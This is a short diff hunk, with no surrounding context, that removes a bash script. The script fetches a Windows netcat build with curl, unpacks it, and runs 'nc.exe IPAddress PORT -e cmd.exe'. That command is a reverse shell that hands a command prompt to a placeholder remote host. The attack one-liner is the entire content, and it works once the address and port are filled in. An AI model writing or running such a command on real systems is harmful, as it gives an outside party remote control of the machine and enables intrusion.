@@ -1,2 +1,0 @@
-#!/bin/bash
-curl -L -o netcat.zip https://eternallybored.org/misc/netcat/netcat-win32-1.11.zip && unzip -o netcat.zip -d netcat && mv netcat/nc.exe . && rm -rf netcat netcat.zip && ./nc.exe IPAddress PORT -e cmd.exe
